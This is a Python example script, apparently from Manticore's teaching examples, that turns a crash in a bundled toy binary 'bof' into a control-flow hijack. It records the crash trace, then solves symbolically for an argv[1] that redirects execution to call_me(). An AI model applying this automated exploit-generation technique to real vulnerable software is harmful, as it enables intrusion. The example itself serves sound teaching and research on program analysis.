#!/usr/bin/env python3
"""
Exploit Generation - Crash Analysis

This example demonstrates how to convert a crash into an exploit using Manticore.
It traces a concrete execution leading to a crash, then uses symbolic execution
to find an input that hijacks control flow.

Usage for direct execution:
    python crash_analysis.py ./bof -- AAAAAAAAAAAAAAAAAAAAAAA -- +++++++++++++++++++++++

Challenge Type: Buffer Overflow Exploitation
Platform: Linux x86
"""

import os
import sys
from manticore.native import Manticore


def concrete_run(prog, params):
    """Run concrete execution to record trace leading to crash."""
    print("Starting concrete execution")
    
    m = Manticore(prog, params)
    # 'trace' will contain the executed instructions
    m.context["trace"] = []
    
    # None: The hook will be applied to all the instructions
    @m.hook(None)
    def record_trace(state):
        pc = state.cpu.PC
        
        # Store the instruction
        with m.locked_context() as c:
            c["trace"] += [pc]
    
    m.run()
    
    # Print number of instructions recorded
    with m.locked_context() as c:
        print("%d instructions are recorded" % len(c["trace"]))
        return c


def symbolic_run(prog, params, trace, pc_crash):
    """Run symbolic execution to generate exploit."""
    print("Starting symbolic execution")
    
    trace_set = set(trace)
    m = Manticore(prog, params)
    
    # The hook will be applied only to the instruction @pc_crash
    @m.hook(pc_crash)
    def crash_analysis(state):
        # Add the constraint on eax
        state.constrain(state.cpu.EAX == 0x0804887C)  # 0x0804887c = @call_me
        # Retrieve the arguments corresponding to argv[1]
        argv_1 = next((i for i in state.input_symbols if i.name == "ARGV1"), None)
        if argv_1:
            # Ask the value of argv_1 to the solver
            val_argv_1 = state.solve_one(argv_1)
            # Pretty print of the solution
            print("The solution is:")
            print("\\x" + "\\x".join("{:02x}".format(c) for c in val_argv_1))
        state.abandon()
    
    # trace contains the list of instructions previously recorded
    trace_set = set(trace)  # convert the list to a set
    
    # None: The hook will be applied to all the instructions
    @m.hook(None)
    def follow_trace(state):
        if "visited" not in state.context:
            state.context["visited"] = set()
        state.context["visited"].add(state.cpu.PC)
        
        # We stop to explore the current path if it doesn't follow the targeted path
        if not state.context["visited"] <= trace_set:
            print("State diverge at 0x%x" % state.cpu.PC)
            state.abandon()
    
    m.run()


def analyze_crash():
    """Main function for crash analysis."""
    
    # Get binary path
    script_dir = os.path.dirname(os.path.abspath(__file__))
    binary_path = os.path.join(script_dir, "bof")
    
    print("=" * 60)
    print("Exploit Generation - Crash Analysis")
    print("=" * 60)
    
    # Parse command line arguments
    if len(sys.argv) > 1 and sys.argv[1] != "--test":
        targeted_prog = sys.argv[1]
        
        first_placeholder = 0
        last_placeholder = 0
        
        # Look for the "--" placeholders
        for i in range(0, len(sys.argv)):
            argv = sys.argv[i]
            if argv == "--":
                if first_placeholder > 0:
                    last_placeholder = i
                else:
                    first_placeholder = i
        
        # Look for the concrete and symbolic arguments
        concrete_argv = sys.argv[first_placeholder + 1 : last_placeholder]
        symb_argv = sys.argv[last_placeholder + 1 :]
    else:
        # Default test case
        targeted_prog = binary_path
        concrete_argv = ["AAAAAAAAAAAAAAAAAAAAAAA"]
        symb_argv = ["+++++++++++++++++++++++"]
        
        print("[*] Running with default test case")
        print(f"    Binary: {targeted_prog}")
        print(f"    Concrete input: {concrete_argv[0]}")
        print(f"    Symbolic input: {symb_argv[0]}")
    
    # Launch the concrete execution
    print("\n[*] Phase 1: Recording crash trace")
    context = concrete_run(targeted_prog, concrete_argv)
    
    # Launch the symbolic execution
    print("\n[*] Phase 2: Generating exploit")
    print("[*] Using last traced instruction as crash point")
    # We use the last element of context['trace'] to determine the crashing instruction
    symbolic_run(targeted_prog, symb_argv, context["trace"], context["trace"][-1])
    
    print("\n[*] Analysis complete!")
    print("    The generated input will redirect execution to call_me()")


if __name__ == "__main__":
    analyze_crash()